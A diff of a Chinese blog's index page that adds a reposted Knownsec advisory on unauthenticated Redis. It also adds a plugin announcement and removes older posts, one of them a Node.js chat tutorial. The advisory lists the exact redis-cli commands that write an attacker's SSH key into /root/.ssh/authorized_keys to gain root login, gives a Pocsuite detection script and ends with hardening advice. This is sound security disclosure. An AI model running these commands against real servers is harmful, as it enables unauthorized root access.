@@ -61,6 +61,190 @@
 
   
     
+    <h3 class="article-title"><a href="/2015/11/12/Redis 未授权访问配合 SSH key 文件利用分析/"><span>Redis 未授权访问配合 SSH key 文件利用分析</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2015/11/12/Redis 未授权访问配合 SSH key 文件利用分析/" rel="bookmark">
+        <time class="entry-date published" datetime="2015-11-11T22:00:55.000Z">
+          2015-11-12
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p>Redis 未授权访问的问题是一直存在的问题，知道创宇安全研究团队历史上也做过相关的应急，今日，又出现 Redis 未授权访问配合 SSH key 文件被利用的情况，今天我们来简要的分析下。</p>
+<p><strong>一、漏洞概述</strong><br>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。</p>
+<p><strong>1、漏洞描述</strong><br>Redis 安全模型的观念是: “请不要将 Redis 暴露在公开网络中, 因为让不受信任的客户接触到 Redis 是非常危险的” 。Redis 作者之所以放弃解决未授权访问导致的不安全性是因为, 99.99% 使用 Redis 的场景都是在沙盒化的环境中, 为了0.01%的可能性增加安全规则的同时也增加了复杂性, 虽然这个问题的并不是不能解决的, 但是这在他的设计哲学中仍是不划算的。<br>为其他受信任用户需要使用 Redis 或者因为运维人员的疏忽等原因，部分 Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，导致其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。<br>利 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以直接使用对应的私钥登录目标服务器。</p>
+<p><strong>2、漏洞影响</strong><br>Redis 暴露在公网（即绑定在0.0.0.0:6379，目标IP公网可访问），并且没有开启相关认证和添加相关安全策略情况下可受影响而导致被利用。<br>通过ZoomEye 的搜索结果显示，有97707在公网可以直接访问的Redis服务。<br><a href="/uploads/2015/11/QQ20151111-0@2x.png"><img src="/uploads/2015/11/QQ20151111-0@2x.png" alt="QQ20151111-0@2x"></a><br>根据 ZoomEye 的探测，全球无验证可直接利用Redis 分布情况如下：<br><a href="/uploads/2015/11/1副本.png"><img src="/uploads/2015/11/1副本.png" alt="1副本"></a><br>全球无验证可直接利用Redis TOP 10国家与地区：<br><a href="/uploads/2015/11/2副本.png"><img src="/uploads/2015/11/2副本.png" alt="2副本"></a></p>
+<p><strong>3、漏洞分析与利用</strong><br>首先在本地生产公私钥文件：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span>ssh-keygen –t rsa</span><br></pre></td></tr></table></figure></p>
+<p><a href="/uploads/2015/11/ssh-keygen.png"><img src="/uploads/2015/11/ssh-keygen.png" alt="ssh-keygen"></a><br>然后将公钥写入 foo.txt 文件<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") &gt; foo.txt</span><br></pre></td></tr></table></figure></p>
+<p>再连接 Redis 写入文件<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit</span><br><span class="line"><span class="meta">$</span> redis-cli -h 192.168.1.11</span><br><span class="line"><span class="meta">$</span> 192.168.1.11:6379&gt; config set dir /root/.ssh/</span><br><span class="line">OK</span><br><span class="line"><span class="meta">$</span> 192.168.1.11:6379&gt; config get dir</span><br><span class="line">1) "dir"</span><br><span class="line">2) "/root/.ssh"</span><br><span class="line"><span class="meta">$</span> 192.168.1.11:6379&gt; config set dbfilename "authorized_keys"</span><br><span class="line">OK</span><br><span class="line"><span class="meta">$</span> 192.168.1.11:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure></p>
+<p><a href="/uploads/2015/11/redis_ssh.png"><img src="/uploads/2015/11/redis_ssh.png" alt="redis_ssh"></a><br>这样就可以成功的将自己的公钥写入 /root/.ssh 文件夹的 authotrized_keys 文件里，然后攻击者直接执行：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ssh –i  id_rsa root@192.168.1.11</span><br></pre></td></tr></table></figure></p>
+<p>即可远程利用自己的私钥登录该服务器。<br>当然，写入的目录不限于 /root/.ssh 下的authorized_keys，也可以写入用户目录，不过 Redis 很多以 root 权限运行，所以写入 root 目录下，可以跳过猜用户的步骤。</p>
+<p><strong>4、Redis 未授权的其他危害与利用</strong><br><strong>a）数据库数据泄露</strong><br>Redis 作为数据库，保存着各种各样的数据，如果存在未授权访问的情况，将会导致数据的泄露，其中包含保存的用户信息等。<br><a href="/uploads/2015/11/redis_user.png"><img src="/uploads/2015/11/redis_user.png" alt="redis_user"></a></p>
+<p><strong>b）代码执行</strong><br>Redis可以嵌套Lua脚本的特性将会导致代码执行, 危害同其他服务器端的代码执行, 样例如下<br>一旦攻击者能够在服务器端执行任意代码, 攻击方式将会变得多且复杂, 这是非常危险的.<br><a href="/uploads/2015/11/redis_lua.png"><img src="/uploads/2015/11/redis_lua.png" alt="redis_lua"></a><br>通过<a href="https://github.com/evilpacket/redis-sha-crack" target="_blank" rel="noopener">Lua代码</a>(<a href="/uploads/2015/11/redis-sha-crack-master.zip">redis-sha-crack-master</a>)攻击者可以调用 redis.sha1hex() 函数，恶意利用 Redis 服务器进行 SHA-1 的破解。</p>
+<p><strong>c）敏感信息泄露</strong><br>通过 Redis 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫。<br><a href="/uploads/2015/11/redis_info.png"><img src="/uploads/2015/11/redis_info.png" alt="redis_info"></a><br>可以看到泄露了很多 Redis 服务器的信息, 有当前 Redis 版本, 内存运行状态, 服务端个数等等敏感信息。</p>
+<p><strong>5、漏洞验证</strong><br>可以使用Pocsuite（<a href="http://github.com/knownsec/pocsuite" target="_blank" rel="noopener">http://github.com/knownsec/pocsuite</a>）执行以下的代码可以用于测试目标地址是否存在未授权的Redis服务。<br>[python]#!/usr/bin/env python</p>
+<h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding:utf-8 --"></a>-<em>- coding:utf-8 -</em>-</h1><p>import socket<br>import urlparse<br>from pocsuite.poc import POCBase, Output<br>from pocsuite.utils import register</p>
+<p>class TestPOC(POCBase):<br>    vulID = ‘89339’<br>    version = ‘1’<br>    author = [‘Anonymous’]<br>    vulDate = ‘2015-10-26’<br>    createDate = ‘2015-10-26’<br>    updateDate = ‘2015-10-26’<br>    references = [‘<a href="http://sebug.net/vuldb/ssvid-89339&#39;]" target="_blank" rel="noopener">http://sebug.net/vuldb/ssvid-89339&#39;]</a><br>    name = ‘Redis 未授权访问 PoC’<br>    appPowerLink = ‘<a href="http://redis.io/&#39;" target="_blank" rel="noopener">http://redis.io/&#39;</a><br>    appName = ‘Redis’<br>    appVersion = ‘All’<br>    vulType = ‘Unauthorized access’<br>    desc = ‘’’<br>        redis 默认不需要密码即可访问，黑客直接访问即可获取数据库中所有信息，造成严重的信息泄露。<br>    ‘’’<br>    samples = [‘’]</p>
+<pre><code>def _verify(self):
+    result = {}
+    payload = &apos;\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a&apos;
+    s = socket.socket()
+    socket.setdefaulttimeout(10)
+    try:
+        host = urlparse.urlparse(self.url).netloc
+        port = 6379
+        s.connect((host, port))
+        s.send(payload)
+        recvdata = s.recv(1024)
+        if recvdata and &apos;redis_version&apos; in recvdata:
+            result[&apos;VerifyInfo&apos;] = {}
+            result[&apos;VerifyInfo&apos;][&apos;URL&apos;] = self.url
+            result[&apos;VerifyInfo&apos;][&apos;Port&apos;] = port
+    except:
+        pass
+    s.close()
+    return self.parse_attack(result)
+
+def _attack(self):
+    return self._verify()
+
+def parse_attack(self, result):
+    output = Output(self)
+    if result:
+        output.success(result)
+    else:
+        output.fail(&apos;Internet nothing returned&apos;)
+    return output
+</code></pre><p>register(TestPOC)[/python]</p>
+<p><strong>二、安全建议</strong><br>配置bind选项，限定可以连接Redis服务器的IP，修改 Redis 的默认端口6379<br>配置认证，也就是AUTH，设置密码，密码会以明文方式保存在Redis配置文件中<br>配置rename-command 配置项 “RENAME_CONFIG”，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度<br>好消息是Redis作者表示将会开发”real user”，区分普通用户和admin权限，普通用户将会被禁止运行某些命令，如config</p>
+<p><strong>三、参考链接</strong></p>
+<ul>
+<li><a href="http://www.sebug.net/vuldb/ssvid-89339" target="_blank" rel="noopener">http://www.sebug.net/vuldb/ssvid-89339</a></li>
+</ul>
+<ul>
+<li><a href="http://antirez.com/news/96" target="_blank" rel="noopener">http://antirez.com/news/96</a></li>
+</ul>
+<ul>
+<li><a href="http://www.secpulse.com/archives/5366.html" target="_blank" rel="noopener">http://www.secpulse.com/archives/5366.html</a></li>
+</ul>
+<ul>
+<li><a href="http://www.sebug.net/vuldb/ssvid-89715" target="_blank" rel="noopener">http://www.sebug.net/vuldb/ssvid-89715</a></li>
+</ul>
+<p>转载自 <a href="http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/" target="_blank" rel="noopener">http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/</a></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/Web-开发/">Web 开发</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+    <div class="article-meta pull-right">
+      <span>
+        <i class="icon-comments"></i>
+        <span>
+          <a href="/2015/11/12/Redis 未授权访问配合 SSH key 文件利用分析/#comment">评论</a>
+        </span>
+      </span>
+    </div>
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2015/11/04/发布个金十数据插件/"><span>发布个金十数据插件</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2015/11/04/发布个金十数据插件/" rel="bookmark">
+        <time class="entry-date published" datetime="2015-11-04T07:05:34.000Z">
+          2015-11-04
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p>好久没像现在这样正式的发布一个东西了，作为我 WordPress 插件的处女作，正好财经类的东西也没多少人做，我很严肃的想了想正好可以填补这个空白。。。嗯废话少说上截图:<br><a href="/uploads/2015/11/Screenshot_2015-11-04-22-50-35.png"><img src="/uploads/2015/11/Screenshot_2015-11-04-22-50-35.png" alt="Screenshot_2015-11-04-22-50-35"></a><br>本插件以小工具形式显示，您可以到外观–&gt;小工具下配置。<br>服务端的为 node.js 编写，<a href="https://github.com/jshensh/auagprice" target="_blank" rel="noopener">https://github.com/jshensh/auagprice</a><br>插件不单独发布源码，请访问 <a href="https://wordpress.org/plugins/jin10" target="_blank" rel="noopener">https://wordpress.org/plugins/jin10</a> 或者后台搜索 jin10 安装插件：<br><a href="/uploads/2015/11/QQ图片20151126001439.png"><img src="/uploads/2015/11/QQ图片20151126001439.png" alt="QQ图片20151126001439"></a></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/程序发布/">程序发布</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+    <div class="article-meta pull-right">
+      <span>
+        <i class="icon-comments"></i>
+        <span>
+          <a href="/2015/11/04/发布个金十数据插件/#comment">评论</a>
+        </span>
+      </span>
+    </div>
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
     <h3 class="article-title"><a href="/2015/11/04/WordPress 插件开发实例 – 详细注释的 Widget 开发例子/"><span>WordPress 插件开发实例 – 详细注释的 Widget 开发例子</span></a></h3>
     
   
@@ -706,148 +890,6 @@
         <i class="icon-comments"></i>
         <span>
           <a href="/2015/10/04/NodeJS中 package.json 解析/#comment">评论</a>
-        </span>
-      </span>
-    </div>
-    
-  </div>
-</article>
-
-
-
-  <article>
-
-  
-    
-    <h3 class="article-title"><a href="/2015/10/02/加上了“财经消息”小工具。。。但我感觉应该没人会看/"><span>加上了“财经消息”小工具。。。但我感觉应该没人会看</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2015/10/02/加上了“财经消息”小工具。。。但我感觉应该没人会看/" rel="bookmark">
-        <time class="entry-date published" datetime="2015-10-01T19:02:32.000Z">
-          2015-10-02
-        </time>
-      </a>
-    </span>
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-        <p>纯用来提升逼格。。。数据来源 <a href="http://www.jin10.com/" target="_blank" rel="noopener">http://www.jin10.com/</a><br>
-      
-    </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-      
-
-    <span class="post-categories">
-      <i class="icon-categories"></i>
-        <a href="/categories/Web-开发/">Web 开发</a>
-    </span>
-    
-
-    
-
-    </div>
-
-    
-    <div class="article-meta pull-right">
-      <span>
-        <i class="icon-comments"></i>
-        <span>
-          <a href="/2015/10/02/加上了“财经消息”小工具。。。但我感觉应该没人会看/#comment">评论</a>
-        </span>
-      </span>
-    </div>
-    
-  </div>
-</article>
-
-
-
-  <article>
-
-  
-    
-    <h3 class="article-title"><a href="/2015/09/29/使用Node.js+Socket.IO搭建WebSocket实时应用/"><span>使用Node.js+Socket.IO搭建WebSocket实时应用</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2015/09/29/使用Node.js+Socket.IO搭建WebSocket实时应用/" rel="bookmark">
-        <time class="entry-date published" datetime="2015-09-29T08:02:31.000Z">
-          2015-09-29
-        </time>
-      </a>
-    </span>
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-        <p>Web领域的实时推送技术，也被称作Realtime技术。这种技术要达到的目的是让用户不需要刷新浏览器就可以获得实时更新。它有着广泛的应用场景，比如在线聊天室、在线客服系统、评论系统、WebIM等。<br><a href="/uploads/2015/09/20140611173333_407.jpg"><img src="/uploads/2015/09/20140611173333_407.jpg" alt="20140611173333_407"></a></p>
-<p><strong>WebSocket简介</strong><br>谈到Web实时推送，就不得不说WebSocket。在WebSocket出现之前，很多网站为了实现实时推送技术，通常采用的方案是轮询 (Polling)和Comet技术，Comet又可细分为两种实现方式，一种是长轮询机制，一种称为流技术，这两种方式实际上是对轮询技术的改进，这些 方案带来很明显的缺点，需要由浏览器对服务器发出HTTP request，大量消耗服务器带宽和资源。面对这种状况，HTML5定义了WebSocket协议，能更好的节省服务器资源和带宽并实现真正意义上的实 时推送。<br>WebSocket协议本质上是一个基于TCP的协议，它由通信协议和编程API组成，WebSocket能够在浏览器和服务器之间建立双向连接， 以基于事件的方式，赋予浏览器实时通信能力。既然是双向通信，就意味着服务器端和客户端可以同时发送并响应请求，而不再像HTTP的请求和响应。<br>为了建立一个WebSocket连接，客户端浏览器首先要向服务器发起一个HTTP请求，这个请求和通常的HTTP请求不同，包含了一些附加头信 息，其中附加头信息”Upgrade: WebSocket”表明这是一个申请协议升级的HTTP请求，服务器端解析这些附加的头信息然后产生应答信息返回给客户端，客户端和服务器端的 WebSocket连接就建立起来了，双方就可以通过这个连接通道自由的传递信息，并且这个连接会持续存在直到客户端或者服务器端的某一方主动的关闭连接。<br>一个典型WebSocket客户端请求头：<br><a href="/uploads/2015/09/20140611173334_763.jpg"><img src="/uploads/2015/09/20140611173334_763.jpg" alt="20140611173334_763"></a><br>前面讲到WebSocket是HTML5中新增的一种通信协议，这意味着一部分老版本浏览器（主要是IE10以下版本）并不具备这个功能，<a href="http://tongji.baidu.com/data/browser" target="_blank" rel="noopener">通过百度统计的公开数据显示</a>，IE8 目前仍以33%的市场份额占据榜首，好在chrome浏览器市场份额逐年上升，现在以超过26%的市场份额位居第二，同时微软前不久宣布停止对IE6的技 术支持并提示用户更新到新版本浏览器，这个曾经让无数前端工程师为之头疼的浏览器有望退出历史舞台，再加上几乎所有的智能手机浏览器都支持HTML5，所 以使得WebSocket的实战意义大增，但是无论如何，我们实际的项目中，仍然要考虑低版本浏览器的兼容方案：在支持WebSocket的浏览器中采用 新技术，而在不支持WebSocket的浏览器里启用Comet来接收发送消息。</p>
-<p><strong>WebSocket实战</strong><br>本文将以多人在线聊天应用作为实例场景，我们先来确定这个聊天应用的基本需求。</p>
-<p><strong>需求分析</strong><br>1、兼容不支持WebSocket的低版本浏览器。<br>2、允许客户端有相同的用户名。<br>3、进入聊天室后可以看到当前在线的用户和在线人数。<br>4、用户上线或退出，所有在线的客户端应该实时更新。<br>5、用户发送消息，所有客户端实时收取。<br>在实际的开发过程中，为了使用WebSocket接口构建Web应用，我们首先需要构建一个实现了 WebSocket规范的服务端，服务端的实现不受平台和开发语言的限制，只需要遵从WebSocket规范即可，目前已经出现了一些比较成熟的 WebSocket服务端实现，比如本文使用的Node.js+Socket.IO。为什么选用这个方案呢？先来简单介绍下他们两。</p>
-<p><strong>Node.js</strong><br>Node.js采用C++语言编写而成，它不是Javascript应用，而是一个Javascript的运行环境，据Node.js创始人 Ryan Dahl回忆，他最初希望采用Ruby来写Node.js，但是后来发现Ruby虚拟机的性能不能满足他的要求，后来他尝试采用V8引擎，所以选择了 C++语言。<br>Node.js支持的系统包括*nux、Windows，这意味着程序员可以编写系统级或者服务器端的Javascript代码，交给 Node.js来解释执行。Node.js的Web开发框架Express，可以帮助程序员快速建立web站点，从2009年诞生至今，Node.js的 成长的速度有目共睹，其发展前景获得了技术社区的充分肯定。</p>
-<p><strong>Socket.IO</strong><br>Socket.IO是一个开源的WebSocket库，它通过Node.js实现WebSocket服务端，同时也提供客户端JS库。Socket.IO支持以事件为基础的实时双向通讯，它可以工作在任何平台、浏览器或移动设备。<br>Socket.IO支持4种协议：WebSocket、htmlfile、xhr-polling、jsonp-polling，它会自动根据浏览 器选择适合的通讯方式，从而让开发者可以聚焦到功能的实现而不是平台的兼容性，同时Socket.IO具有不错的稳定性和性能。</p>
-<p><strong>编码实现</strong><br>本文一开始的的插图就是效果演示图：可以<a href="http://demo.plhwin.com/chat/" target="_blank" rel="noopener">点击这里</a>查看在线演示，整个开发过程非常简单，下面简单记录了开发步骤：</p>
-<p><strong>安装Node.js</strong><br>根据自己的操作系统，去Node.js官网下载安装即可。如果成功安装。在命令行输入node -v和npm -v应该能看到相应的版本号。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">node -v </span><br><span class="line">v0.10.26 </span><br><span class="line">npm -v </span><br><span class="line">1.4.6</span><br></pre></td></tr></table></figure></p>
-<p><strong>搭建WebSocket服务端</strong><br>这个环节我们尽可能的考虑真实生产环境，把WebSocket后端服务搭建成一个线上可以用域名访问的服务，如果你是在本地开发环境，可以换成本地ip地址，或者使用一个虚拟域名指向本地ip。<br>先进入到你的工作目录，比如 /workspace/wwwroot/plhwin/realtime.plhwin.com，新建一个名为 package.json的文件，内容如下：<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"realtime-server"</span>,</span><br><span class="line">  <span class="attr">"version"</span>: <span class="string">"0.0.1"</span>,</span><br><span class="line">  <span class="attr">"description"</span>: <span class="string">"my first realtime server"</span>,</span><br><span class="line">  <span class="attr">"dependencies"</span>: &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>接下来使用npm命令安装express和socket.io<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install --save express</span><br><span class="line">npm install --save socket.io</span><br></pre></td></tr></table></figure></p>
-<p>安装成功后，应该可以看到工作目录下生成了一个名为node_modules的文件夹，里面分别是express和socket.io，接下来可以开始编写服务端的代码了，新建一个文件：index.js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="built_in">require</span>(<span class="string">'express'</span>)();</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>).Server(app);</span><br><span class="line"><span class="keyword">var</span> io = <span class="built_in">require</span>(<span class="string">'socket.io'</span>)(http);</span><br><span class="line"> </span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="string">'&lt;h1&gt;Welcome Realtime Server&lt;/h1&gt;'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">http.listen(<span class="number">3000</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'listening on *:3000'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
-<p>命令行运行node index.js，如果一切顺利，你应该会看到返回的listening on *:3000字样，这说明服务已经成功搭建了。此时浏览器中打开<a href="http://localhost:3000应该可以看到正常的欢迎页面。" target="_blank" rel="noopener">http://localhost:3000应该可以看到正常的欢迎页面。</a><br>如果你想要让服务运行在线上服务器，并且可以通过域名访问的话，可以使用Nginx做代理，在nginx.conf中添加如下配置，然后将域名（比如：realtime.plhwin.com）解析到服务器IP即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">server</span><br><span class="line"> &#123;</span><br><span class="line">   listen       80;</span><br><span class="line">   server_name  realtime.plhwin.com;</span><br><span class="line">   location / &#123;</span><br><span class="line">     proxy_pass http://127.0.0.1:3000;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
-<p>完成以上步骤，<a href="http://realtime.plhwin.com:3000的后端服务就正常搭建了。" target="_blank" rel="noopener">http://realtime.plhwin.com:3000的后端服务就正常搭建了。</a><br><a href="/uploads/2015/09/20140611173334_655.jpg"><img src="/uploads/2015/09/20140611173334_655.jpg" alt="20140611173334_655"></a></p>
-<p><strong>服务端代码实现</strong><br>前面讲到的index.js运行在服务端，之前的代码只是一个简单的WebServer欢迎内容，让我们把WebSocket服务端完整的实现代码加入进去，整个服务端就可以处理客户端的请求了。完整的index.js代码如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"format-detection"</span> <span class="attr">content</span>=<span class="string">"telephone=no"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"format-detection"</span> <span class="attr">content</span>=<span class="string">"email=no"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0"</span> <span class="attr">name</span>=<span class="string">"viewport"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>多人聊天室<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"./style.css"</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--[if lt IE 8]&gt;&lt;script src="./json3.min.js"&gt;&lt;/script&gt;&lt;![endif]--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://realtime.plhwin.com:3000/socket.io/socket.io.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"loginbox"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width:260px;margin:200px auto;"</span>&gt;</span></span><br><span class="line">                请先输入你在聊天室的昵称</span><br><span class="line">                <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">style</span>=<span class="string">"width:180px;"</span> <span class="attr">placeholder</span>=<span class="string">"请输入用户名"</span> <span class="attr">id</span>=<span class="string">"username"</span> <span class="attr">name</span>=<span class="string">"username"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">style</span>=<span class="string">"width:50px;"</span> <span class="attr">value</span>=<span class="string">"提交"</span> <span class="attr">onclick</span>=<span class="string">"CHAT.usernameSubmit();"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"chatbox"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background:#3d3d3d;height: 28px; width: 100%;font-size:12px;"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"line-height: 28px;color:#fff;"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">"text-align:left;margin-left:10px;"</span>&gt;</span>Websocket多人聊天室<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">"float:right; margin-right:10px;"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"showusername"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> |</span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:;"</span> <span class="attr">onclick</span>=<span class="string">"CHAT.logout()"</span> <span class="attr">style</span>=<span class="string">"color:#fff;"</span>&gt;</span>退出<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span 